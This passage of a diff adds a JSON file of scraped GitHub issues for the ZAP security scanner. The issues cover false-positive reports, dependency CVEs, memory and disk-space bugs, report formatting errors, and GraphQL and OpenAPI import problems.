[10202]\nPASS: Private IP Di",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2025-12-18T06:54:32+00:00",
+    "closed_at": "2025-12-18T07:58:18+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/9193",
+    "language": "Java",
+    "author": "rr1010",
+    "comments_count": 4,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 9114,
+    "title": "False Positive -",
+    "description": "The following details are reported by Zap for our solution:\n\nCWE 200 - Exposure of Sensitive Information to an Unauthorized Actor\n\nAn information exposure is the intentional or unintentional disclosure of information to an actor that is not explicitly authorized to have access to that information.\n\nThe information either\n\nis regarded as sensitive within the product's own functionality, such as a private message; or\nprovides information about the product or its environment that could be useful in an attack but is normally not available to the attacker, such as the installation path of a product that is remotely accessible.\n\nDescription:\nThis method is now most commonly used in REST services, PATCH is used for **modify** capabilities. The PATCH request only needs to contain the changes to the resource, not the complete resource.\n\nSolution:\nImplement measures to obfuscate or disguise information about the system's platform, web application software technology, backend database version, configurations, and network architecture/topology. This can include:\n\n1. **Platform and Software Diversity:** Use a mix of technologies and platforms to make it harder for attackers to build an accurate profile.\n\n2. **False Information:** Introduce fake or misleading information in system responses to confuse fingerprinting tools.\n\n3. **Response Randomization:** Randomize certain elements in responses to make it difficult for attackers to consistently identify the system.\n\n4. **Firewall Rules:** Implement firewall rules to block or limit the effectiveness of fingerprinting techniques.\n\n5. **Regular Updates:** Keep software, platforms, and configurations up-to-date to patch known vulnerabilities and prevent accurate identification based on outdated information.\n\nThere is no one-size-fits-all solution, and a combination of these measures may be most effective.\n\n---\n\nThis has been flagged as a false positive based on the following:  \n\nThe relative path for a link identified by ZAP as a finding is from an error page returned by the server due an invalid request URL (See the raw zap report xml since SRM does not display the actual path). The URL cannot be exploited since it is an error page.\n",
+    "labels": [
+      "InsufficientEvidence"
+    ],
+    "state": "closed",
+    "created_at": "2025-10-30T16:54:36+00:00",
+    "closed_at": "2026-02-27T12:25:43+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/9114",
+    "language": "Java",
+    "author": "somerscalesUSN",
+    "comments_count": 7,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 9137,
+    "title": "Third Party Dependency Vulnerabilities",
+    "description": "Hello,\n\nI was doing some security vulnerability scanning of Zaproxy  2.16.1 and noticed that some third party jars have some reported CVEs associated with them. Mainly to do with `org.bouncycastle:bcprov-jdk18on` and `commons-beanutils:commons-beanutils `\n\nI was curious if you have plans to update these dependencies in the future and what timeline that might have. \n\nAlso if you know that Zaproxy is not effected by these CVEs that would also be helpful.\n\nThank you\n\nName | Vulnerable package | Severity | Description | Fixed in\n-- | -- | -- | -- | --\nCVE-2024-29857 | org.bouncycastle:bcprov-jdk18on | HIGH | An issue was discovered in ECCurve.java and ECCurve.cs in Bouncy Castle Java (BC Java) before 1.78, BC Java LTS before 2.73.6, BC-FJA before 1.0.2.5, and BC C# .Net before 2.3.1. Importing an EC certificate with crafted F2m parameters can lead to excessive CPU consumption during the evaluation of the curve parameters. | 1.78\nCVE-2024-30172 | org.bouncycastle:bcprov-jdk18on | HIGH | An issue was discovered in Bouncy Castle Java Cryptography APIs before 1.78. An Ed25519 verification code infinite loop can occur via a crafted signature and public key. | 1.78\nCVE-2025-48734 | commons-beanutils:commons-beanutils, commons-beanutils:commons-beanutils | HIGH | Improper Access Control vulnerability in Apache Commons. A special BeanIntrospector class was added in version 1.9.2. This can be used to stop attackers from using the declared class property of Java enum objects to get access to the classloader. However this protection was not enabled by default. PropertyUtilsBean (and consequently BeanUtilsBean) now disallows declared class level property access by default. Releases 1.11.0 and 2.0.0-M2 address a potential security issue when accessing enum properties in an uncontrolled way. If an application using Commons BeanUtils passes property paths from an external source directly to the getProperty() method of PropertyUtilsBean, an attacker can access the enum’s class loader via the “declaredClass” property available on all Java “enum” objects. Accessing the enum’s “declaredClass” allows remote attackers to access the ClassLoader and execute arbitrary code. The same issue exists with PropertyUtilsBean.getNestedProperty(). Starting in versions 1.11.0 and 2.0.0-M2 a s | 1.11.0,1.11.0\nCVE-2024-34447 | org.bouncycastle:bcprov-jdk18on | HIGH | An issue was discovered in the Bouncy Castle Crypto Package For Java before BC TLS Java 1.0.19 (ships with BC Java 1.78, BC Java (LTS) 2.73.6) and before BC FIPS TLS Java 1.0.19. When endpoint identification is enabled in the BCJSSE and an SSL socket is created without an explicit hostname (as happens with HttpsURLConnection), hostname verification could be performed against a DNS-resolved IP address in some situations, opening up a possibility of DNS poisoning. | 1.78\nCVE-2025-8885 | org.bouncycastle:bcprov-jdk18on | MEDIUM | Allocation of Resources Without Limits or Throttling vulnerability in Legion of the Bouncy Castle",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2025-11-14T18:13:33+00:00",
+    "closed_at": "2025-11-14T22:02:51+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/9137",
+    "language": "Java",
+    "author": "owenfairholm",
+    "comments_count": 9,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 3486,
+    "title": "Enhancement: ZAP GUI Warn User When its out of Memory",
+    "description": "I ran out of memory using ZAP. It kept running but the history wouldn't update, and I was trying to figure out why. I went into the zap log and found lots of entries like the one below.  Seems like it would be helpful to the user if ZAP presented something in the UI that it was low on memory and you might want to do something about it. Like restart, restart with more memory, etc. Right now it silently fails (except for these entries in the log).\r\n\r\n> 2017-05-04 12:09:59,083 [ZAP-PassiveScanner] FATAL ENGINE - /Users/dwichers/Documents/projectname/ZAP-App-Admin.session.data getFromFile failed 19689641\r\n> org.hsqldb.HsqlException: java.lang.OutOfMemoryError: Java heap space\r\n>         at org.hsqldb.error.Error.error(Unknown Source)\r\n>         at org.hsqldb.persist.DataFileCache.getFromFile(Unknown Source)\r\n>         at org.hsqldb.persist.DataFileCache.get(Unknown Source)\r\n>         at org.hsqldb.persist.RowStoreAVLDisk.get(Unknown Source)\r\n>         at org.hsqldb.index.NodeAVLDisk.findNode(Unknown Source)\r\n>         at org.hsqldb.index.NodeAVLDisk.getRight(Unknown Source)\r\n>         at org.hsqldb.index.IndexAVL.findNode(Unknown Source)\r\n>         at org.hsqldb.index.IndexAVL.findFirstRow(Unknown Source)\r\n>         at org.hsqldb.RangeVariable$RangeIteratorMain.getFirstRow(Unknown Source)\r\n>         at org.hsqldb.RangeVariable$RangeIteratorMain.initialiseIterator(Unknown Source)\r\n>         at org.hsqldb.RangeVariable$RangeIteratorMain.next(Unknown Source)\r\n>         at org.hsqldb.QuerySpecification.buildResult(Unknown Source)\r\n>         at org.hsqldb.QuerySpecification.getSingleResult(Unknown Source)\r\n>         at org.hsqldb.QuerySpecification.getResult(Unknown Source)\r\n>         at org.hsqldb.StatementQuery.getResult(Unknown Source)\r\n>         at org.hsqldb.StatementDMQL.execute(Unknown Source)\r\n>         at org.hsqldb.Session.executeCompiledStatement(Unknown Source)\r\n>         at org.hsqldb.Session.execute(Unknown Source)\r\n>         at org.hsqldb.jdbc.JDBCPreparedStatement.fetchResult(Unknown Source)\r\n>         at org.hsqldb.jdbc.JDBCPreparedStatement.execute(Unknown Source)\r\n>         at org.parosproxy.paros.db.paros.ParosTableHistory.read(Unknown Source)\r\n>         at org.parosproxy.paros.model.HistoryReference.<init>(Unknown Source)\r\n>         at org.parosproxy.paros.extension.history.ExtensionHistory.getHistoryReference(Unknown Source)\r\n>         at org.zaproxy.zap.extension.pscan.PassiveScanThread.getHistoryReference(Unknown Source)\r\n>         at org.zaproxy.zap.extension.pscan.PassiveScanThread.run(Unknown Source)",
+    "labels": [
+      "enhancement",
+      "Component-UI",
+      "Usability",
+      "Performance"
+    ],
+    "state": "closed",
+    "created_at": "2017-05-04T16:19:53+00:00",
+    "closed_at": "2025-11-24T15:16:48+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/3486",
+    "language": "Java",
+    "author": "davewichers",
+    "comments_count": 9,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 9147,
+    "title": "just don't wori",
+    "description": "### Describe the bug:\n\n<details>\n<summary>Perfectly normal log sample</summary>\n\nzap-1  | Found Java version 17.0.17\nzap-1  | Available memory: 15813 MB\nzap-1  | Using JVM args: -Xmx3953m\nzap-1  | 717 [main] INFO  org.parosproxy.paros.Constant - Copying default configuration to /home/zap/.ZAP/config.xml\nzap-1  | 867 [main] INFO  org.parosproxy.paros.Constant - Creating directory /home/zap/.ZAP/session\nzap-1  | 868 [main] INFO  org.parosproxy.paros.Constant - Creating directory /home/zap/.ZAP/dirbuster\nzap-1  | 868 [main] INFO  org.parosproxy.paros.Constant - Creating directory /home/zap/.ZAP/fuzzers\nzap-1  | 868 [main] INFO  org.parosproxy.paros.Constant - Creating directory /home/zap/.ZAP/plugin\nzap-1  | 962 [main] INFO  org.zaproxy.zap.DaemonBootstrap - ZAP 2.16.1 started 20/11/2025, 19:20:21 with home: /home/zap/.ZAP/ cores: 4 maxMemory: 3 GB\nzap-1  | 3177 [ZAP-daemon] INFO  org.zaproxy.zap.control.ExtensionFactory - Installed add-ons: [[id=alertFilters, version=25.0.0], [id=ascanrules, version=75.0.0], [id=authhelper, version=0.30.0], [id=automation, version=0.54.0], [id=bruteforce, version=18.0.0], [id=callhome, version=0.17.0], [id=client, version=0.18.0], [id=commonlib, version=1.38.0], [id=database, version=0.8.0], [id=diff, version=17.0.0], [id=directorylistv1, version=9.0.0], [id=domxss, version=22.0.0], [id=encoder, version=1.7.0], [id=exim, version=0.15.0], [id=formhandler, version=6.7.0], [id=fuzz, version=13.16.0], [id=gettingStarted, version=19.0.0], [id=graaljs, version=0.11.0], [id=graphql, version=0.28.0], [id=help, version=21.0.0], [id=hud, version=0.19.0], [id=invoke, version=16.0.0], [id=network, version=0.23.0], [id=oast, version=0.23.0], [id=onlineMenu, version=14.0.0], [id=openapi, version=47.0.0], [id=postman, version=0.7.0], [id=pscan, version=0.5.0], [id=pscanrules, version=69.0.0], [id=quickstart, version=52.0.0], [id=replacer, version=20.0.0], [id=reports, version=0.41.0], [id=requester, version=7.8.0], [id=retest, version=0.11.0], [id=retire, version=0.50.0], [id=reveal, version=10.0.0], [id=scanpolicies, version=0.6.0], [id=scripts, version=45.15.0], [id=selenium, version=15.41.0], [id=sequence, version=8.0.0], [id=soap, version=28.0.0], [id=spider, version=0.17.0], [id=spiderAjax, version=23.27.0], [id=tips, version=15.0.0], [id=webdriverlinux, version=164.0.0], [id=websocket, version=34.0.0], [id=zest, version=48.10.0]]\nzap-1  | 3178 [ZAP-daemon] INFO  org.zaproxy.zap.control.ExtensionFactory - Loading extensions\nzap-1  | 3527 [ZAP-daemon] INFO  org.zaproxy.addon.network.internal.TlsUtils - Using supported SSL/TLS protocols: [TLSv1.2, TLSv1.3]\nzap-1  | 3973 [ZAP-daemon] INFO  org.zaproxy.zap.control.ExtensionFactory - Extensions loaded\nzap-1  | Nov 20, 2025 7:20:26 PM java.util.prefs.FileSystemPreferences$1 run\nzap-1  | INFO: Created user preferences directory.\nzap-1  | 5296 [ZAP-daemon] INFO  org.parosproxy.paros.extension.ExtensionLoader - Initializing Auto-update Extension - Allows ZAP to check for updates\nzap-",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2025-11-20T20:07:01+00:00",
+    "closed_at": "2025-11-21T09:05:03+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/9147",
+    "language": "Java",
+    "author": "lmaddox",
+    "comments_count": 3,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 8327,
+    "title": "Handle lack of disk space better",
+    "description": "### Describe the bug\n\nZAP scanning progress become frosen on few days when autoscanning specific site vps.ua\n\n### Steps to reproduce the behavior\n\nRun ZAP and start autoscan vps.ua URL\r\nWait few days and observe that scanning progress become frosen on 18%\r\nClick Stop button and observe that Attack button remains disabled, see java trace attached \r\n[ZAP-gui-hang-during-stop-scan.txt](https://github.com/zaproxy/zaproxy/files/14173638/ZAP-gui-hang-during-stop-scan.txt)\r\n\n\n### Expected behavior\n\nscanning progress should not be frosen\n\n### Software versions\n\nZAP Version: 2.14.0\r\n\r\nInstalled Add-ons: [[id=alertFilters, version=19.0.0],\r\n[id=ascanrules, version=59.0.0], [id=ascanrulesBeta,\r\nversion=48.0.0], [id=authhelper, version=0.10.0],\r\n[id=automation, version=0.35.0], [id=bruteforce,\r\nversion=15.0.0], [id=callhome, version=0.10.0],\r\n[id=commonlib, version=1.22.0], [id=coreLang,\r\nversion=15.0.0], [id=custompayloads, version=0.13.0],\r\n[id=database, version=0.3.0], [id=diff, version=14.0.0],\r\n[id=directorylistv1, version=7.0.0], [id=directorylistv2_3,\r\nversion=4.0.0], [id=directorylistv2_3_lc, version=4.0.0],\r\n[id=domxss, version=18.0.0], [id=encoder, version=1.4.0],\r\n[id=exim, version=0.8.0], [id=formhandler, version=6.5.0],\r\n[id=fuzz, version=13.12.0], [id=fuzzdboffensive,\r\nversion=5.0.0], [id=gettingStarted, version=16.0.0],\r\n[id=graaljs, version=0.5.0], [id=graphql, version=0.22.0],\r\n[id=help, version=17.0.0], [id=hud, version=0.18.0],\r\n[id=invoke, version=14.0.0], [id=network, version=0.12.0],\r\n[id=oast, version=0.17.0], [id=onlineMenu, version=12.0.0],\r\n[id=openapi, version=39.0.0], [id=portscan, version=10.0.0],\r\n[id=postman, version=0.2.0], [id=pscanrules,\r\nversion=55.0.0], [id=pscanrulesBeta, version=36.0.0],\r\n[id=quickstart, version=43.0.0], [id=replacer,\r\nversion=16.0.0], [id=reports, version=0.28.0],\r\n[id=requester, version=7.4.0], [id=retest, version=0.8.0],\r\n[id=retire, version=0.30.0], [id=reveal, version=7.0.0],\r\n[id=scripts, version=44.0.0], [id=selenium,\r\nversion=15.15.0], [id=soap, version=21.0.0], [id=spider,\r\nversion=0.7.0], [id=spiderAjax, version=23.18.0],\r\n[id=sqliplugin, version=15.0.0], [id=svndigger,\r\nversion=4.0.0], [id=tips, version=12.0.0], [id=tokengen,\r\nversion=15.0.0], [id=wappalyzer, version=21.29.0],\r\n[id=webdriverwindows, version=70.0.0], [id=websocket,\r\nversion=30.0.0], [id=zest, version=42.0.0]]\r\n\r\nOperating System: Windows 10\r\nArchitecture: amd64\r\nJava Version: Eclipse Adoptium 21.0.1\r\nSystem's Locale: uk_UA\r\nDisplay Locale: en_GB\r\nFormat Locale: uk_UA\r\nDefault Charset: UTF-8\r\nZAP Home Directory: C:\\Users\\Admin\\ZAP\\\r\nZAP Installation Directory: C:\\Program Files\\ZAP\\Zed Attack Proxy\\.\\\r\nLook and Feel: FlatLaf Light (com.formdev.flatlaf.FlatLightLaf)\r\n\n\n### Screenshots\n\n_No response_\n\n### Errors from the zap.log file\n\n[zaplogs.zip](https://github.com/zaproxy/zaproxy/files/14173657/zaplogs.zip)\r\n\n\n### Additional context\n\n_No response_\n\n### Would you like to help fix this issue?\n\n- [ ] Yes",
+    "labels": [
+      "bug",
+      "Usability",
+      "Performance"
+    ],
+    "state": "closed",
+    "created_at": "2024-02-06T01:48:05+00:00",
+    "closed_at": "2025-11-21T14:45:06+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/8327",
+    "language": "Java",
+    "author": "JuraLys",
+    "comments_count": 5,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 9251,
+    "title": "\"Insufficient Site Isolation Against Spectre Vulnerability\" reports incorrect alertRef for instances in json report. (pluginid: 90004)",
+    "description": "### Describe the bug:\n\nInsufficient Site Isolation Against Spectre Vulnerability reports incorrect alertRef for instances in json report. (pluginid: 90004)\n\nConsider this case to understand the issue:\n\nWe scanned webgoat application and found that 15 instances of \"Insufficient Site Isolation Against Spectre Vulnerability\" were reported even though the systemic alerts limit was set to default (5). \n\nReason: They have different alertRef.\n\n15 instances:\n\n5 instances for 90004-1 : Cross-Origin-Resource-Policy Header Missing or Invalid\n5 instances for 90004-2 : Cross-Origin-Embedder-Policy Header Missing or Invalid\n5 instances for 90004-3 : Cross-Origin-Opener-Policy Header Missing or Invalid\n\nAttached screenshot for details.\n\nHowever, json report generated by ZAP reported all 15 instances with alertRef as 90004-1 as shown below (but in reality 5 instances have alertRef as 90004-2 and 5 instances have alertRef as 90004-3, there is no mentioned of 90004-2 or 90004-3 in json report):\n```\n{\n          \"pluginid\": \"90004\",\n          \"alertRef\": \"90004-1\",\n          \"alert\": \"Insufficient Site Isolation Against Spectre Vulnerability\",\n          \"name\": \"Insufficient Site Isolation Against Spectre Vulnerability\",\n          \"riskcode\": \"1\",\n          \"confidence\": \"2\",\n          \"riskdesc\": \"Low (Medium)\",\n          \"desc\": \"<p>Cross-Origin-Resource-Policy header is an opt-in header designed to counter side-channels attacks like Spectre. Resource should be specifically set as shareable amongst different origins.</p>\",\n          \"instances\": [\n            {\n              \"id\": \"47\",\n              \"uri\": \"http://<masked>/WebGoat/login\",\n              \"nodeName\": \"<masked>/WebGoat/login\",\n              \"method\": \"GET\",\n              \"param\": \"Cross-Origin-Resource-Policy\",\n              \"attack\": \"\",\n              \"evidence\": \"\",\n              \"otherinfo\": \"\",\n              \"request-header\": \"G..\",\n              \"request-body\": \"\",\n              \"response-header\": \"..\"\n            },\n            {\n             \"id\": \"87\",\n              \"uri\": \"http://<masked>/WebGoat/service/labels.mvc\",\n              \"nodeName\": \"http://<masked>/WebGoat/service/labels.mvc\",\n              \"method\": \"GET\",\n              \"param\": \"Cross-Origin-Resource-Policy\",\n              \"attack\": \"\",\n              \"evidence\": \"\",\n              \"otherinfo\": \"\",\n              \"request-header\": \"...\",\n              \"request-body\": \"\",\n              \"request-body\": \"\",\n              \"response-header\": \"..\"\n            }\n\n            ..\n\n          \"count\": \"15\",  //All 15 instances are assumed to have the same alertRef (90004-1)\n          \"systemic\": true,\n          \"solution\": \"<..\",\n          \"otherinfo\": \"\",\n          \"reference\": \"<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy</p>\",\n          \"cweid\": \"693\",\n          \"wascid\": \"14\",\n          \"sourceid\": \"10\",\n          \"tags\": [\n            {\n              \"tag\": \"OWASP_2017_A03\",\n        ",
+    "labels": [
+      "bug",
+      "add-on",
+      "in:pscanrulesBeta"
+    ],
+    "state": "closed",
+    "created_at": "2026-02-18T10:30:40+00:00",
+    "closed_at": "2026-02-19T08:26:20+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/9251",
+    "language": "Java",
+    "author": "kamalpreetSec",
+    "comments_count": 2,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 9249,
+    "title": "Graphql Addon URL schema no longer supports json type schema",
+    "description": "### Describe the bug:\n\nAround Feb 14th (AEST) a weekly graphql scan that imported a JSON schema via URL started returning an error as below. (Note, using public examples for this report)\n\n```\n   Job graphql importing schema from URL: https://raw.githubusercontent.com/graphile/examples/67d34c4d22b72544fa134eb714610adb0ed73d3d/data/schema.json target: https://does1not1exist1example.net/graphql\n   Unexpected error errors=[InvalidSyntaxError{ message=Invalid syntax with offending token '\"data\"' at line 2 column 3 ,offendingToken=\"data\" ,locations=[SourceLocation{line=2, column=3}] ,sourcePreview={\n  \"data\": {\n    \"__schema\": {\n      \"queryType\": {\n        \"name\": \"Query\"\n}] - see log for details\n   Job graphql finished, time taken: 00:00:00\n```\n\nThis error does not present if you same the schema.json locally and use local file import.\n\nAutomation to cause the error (noting warnings on load because no alerts configured):\n\n\n[gql_schema_test.yaml](https://github.com/user-attachments/files/25349702/gql_schema_test.yaml)\n\n\nSaving the referenced schema file to the same directory and changing the above automation configuration to use `schemaFile: \"schema.json\"` successfully imports the file.\n\n[https://raw.githubusercontent.com/graphile/examples/67d34c4d22b72544fa134eb714610adb0ed73d3d/data/schema.json](https://raw.githubusercontent.com/graphile/examples/67d34c4d22b72544fa134eb714610adb0ed73d3d/data/schema.json)\n\n### Steps to reproduce the behavior:\n\nRun the automation file attached to this issue.\n\n[gql_schema_test.yaml](https://github.com/user-attachments/files/25349702/gql_schema_test.yaml)\n\n### Expected behavior:\n\nThe Graphql Add On be able to import the json based schema file by URL, which, depending on the service used for generation may start with a 'data' root element.  \n\n### Software Versions:\n\nZAP\nVersion: 2.17.0\n\nInstalled Add-ons: [[id=alertFilters, version=26.0.0],\n[id=ascanrules, version=78.0.0], [id=authhelper,\nversion=0.34.0], [id=automation, version=0.58.0],\n[id=bruteforce, version=20.0.0], [id=callhome,\nversion=0.20.0], [id=client, version=0.20.0], [id=commonlib,\nversion=1.39.0], [id=custompayloads, version=0.16.0],\n[id=database, version=0.9.0], [id=diff, version=18.0.0],\n[id=directorylistv1, version=9.0.0], [id=domxss,\nversion=23.0.0], [id=encoder, version=1.8.0], [id=exim,\nversion=0.16.0], [id=formhandler, version=6.8.0], [id=fuzz,\nversion=13.16.0], [id=gettingStarted, version=20.0.0],\n[id=graaljs, version=0.12.0], [id=graphql, version=0.31.0],\n[id=help, version=22.0.0], [id=hud, version=0.19.0],\n[id=insights, version=0.0.1], [id=invoke, version=17.0.0],\n[id=network, version=0.25.0], [id=oast, version=0.24.0],\n[id=onlineMenu, version=15.0.0], [id=openapi,\nversion=48.0.0], [id=postman, version=0.9.0], [id=pscan,\nversion=0.6.0], [id=pscanrules, version=70.0.0],\n[id=quickstart, version=53.0.0], [id=replacer,\nversion=21.0.0], [id=reports, version=0.43.0],\n[id=requester, version=7.9.0], [id=retest, version=0.11.0],\n[id=retire, version=0.52.0], ",
+    "labels": [
+      "enhancement",
+      "add-on",
+      "in:graphql"
+    ],
+    "state": "closed",
+    "created_at": "2026-02-16T21:23:25+00:00",
+    "closed_at": "2026-02-18T11:49:12+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/9249",
+    "language": "Java",
+    "author": "sjames-au",
+    "comments_count": 1,
+    "code_snippets": [
+      {
+        "code": "Job graphql importing schema from URL: https://raw.githubusercontent.com/graphile/examples/67d34c4d22b72544fa134eb714610adb0ed73d3d/data/schema.json target: https://does1not1exist1example.net/graphql\n   Unexpected error errors=[InvalidSyntaxError{ message=Invalid syntax with offending token '\"data\"' at line 2 column 3 ,offendingToken=\"data\" ,locations=[SourceLocation{line=2, column=3}] ,sourcePreview={\n  \"data\": {\n    \"__schema\": {\n      \"queryType\": {\n        \"name\": \"Query\"\n}] - see log for details\n   Job graphql finished, time taken: 00:00:00",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 9142,
+    "title": "ZAP automation framework Openapi import not working in securecodebox",
+    "description": "### Describe the bug:\n\nWe have the securecodebox setup and zap automation framework scan type running in our AWS EKS cluster installed via ArgoCD & Helm. We are able to run a sample scan with basic authentication with the Scan Job CRDS and automation template configmaps. We have the DefectDojo UI and its hooks running on the same cluster. The scan reports are uploaded properly and we could see the vulnerability in DefectDojo UI. so basically end-to-end functions is working fine.\n\nBut the issue here is, we want to add API collections to the scan to check the security scan on these endpoints. We are exploring the openapi type job for fetching the endpoints from the file and add it to the scanner. But the logs were showing that it fetches number of URLs from the file but it seems like those endpoints were not added to the scan and its not their in the final report(DefectDojo).\n\nWe want the all the endpoints and its operations(request/post) should be scanned along with the other scans(Active/Spider).\n\nI need some clarification on the followings,\n\n* Is there a configuration missing to add these to the site tree, or is there any default restriction blocking?\n* The logs show that openapi added 6 URLs and 5 URLs. Why are the added URLs not in the scan report?\n* Share with me if there is any example document for using openapi jobs\n\n### Steps to reproduce the behavior:\n\nPlease find the below scan configuration & configmaps and help me troubleshoot the issue.\n```yaml\n----\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: zap-automation-template\n  namespace: securecodebox-system\ndata:\n  automation-template.yaml: |\n    env:\n      parameters:\n        logLevel: DEBUG\n      contexts:\n        - name: qportal-context\n          urls: [\"https://staging.example.com\",\"https://api.staging.example.com\"]\n          includePaths:\n            - \"https://staging.example.com.*\"\n            - \"https://api.staging.example.com.*\"\n            - \"https://api.auth.staging.example.com.*\"\n            - \"https://api.staging.example.com/api/.*\"\n          excludePaths:\n            - \".*logout.*\"\n          authentication:\n            method: json\n            parameters:\n              loginPageUrl: \"https://staging.example.com/login\"\n              loginRequestUrl: \"https://api.auth.staging.example.com/api/v3/users/login\"\n              loginRequestBody: '{\"username\":\"aaaaaa@bbbb.com\",\"password\":\"abssfsd@123\",\"organisation_id\":\"d6102806-7edc-428c-b599-346324cb87ba\"}'\n            verification:\n              method: response\n              loggedInRegex: '(?i)(successful|token)'\n              loggedOutRegex: '(?i)(error|invalid)'\n          users:\n            - name: qportal-user\n              credentials:\n                username: aaaaaa@bbbb.com\n                password: abssfsd@123\n          sessionManagement:\n            method: http\n    jobs:\n      - type: passiveScan-wait\n        parameters:\n          maxDuration: 10\n      # Spider + scan will be appended automatically after OpenAPI jobs\n ",
+    "labels": [
+      "question"
+    ],
+    "state": "closed",
+    "created_at": "2025-11-18T06:15:38+00:00",
+    "closed_at": "2025-11-18T09:14:34+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/9142",
+    "language": "Java",
+    "author": "parthipan-e",
+    "comments_count": 2,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 9247,
+    "title": "system drives goes full when I use AJAX Spider",
+    "description": "### Describe the bug:\n\nI use Windows 11 and have **70GB** free of space. But after a while I started the AJAX-Spider the disk goes fully.\nI disabled \"Persist temporary HTTP messages\"\nI start AJAX Spider from context entry with Firefox Headless selected.\n\n\n### Steps to reproduce the behavior:\n\n- Start ZAP\n- Load/create context\n- Enter authentication for json login\n- right click to context and start AJAX Spider\n- wait and be amazement\n\n\n### Expected behavior:\n\nself regulation that not crow content of sessions\n\n### Software Versions:\n\nVersion 2.17.0\n\n### Screenshots:\n\n_No response_\n\n### Errors from the zap.log file:\n\n_No response_\n\n### Additional context:\n\n_No response_\n\n### Would you like to help fix this issue?\n\n- [ ] Yes",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-02-14T19:19:17+00:00",
+    "closed_at": "2026-02-15T10:42:09+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/9247",
+    "language": "Java",
+    "author": "Adi-18",
+    "comments_count": 1,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  }
+]
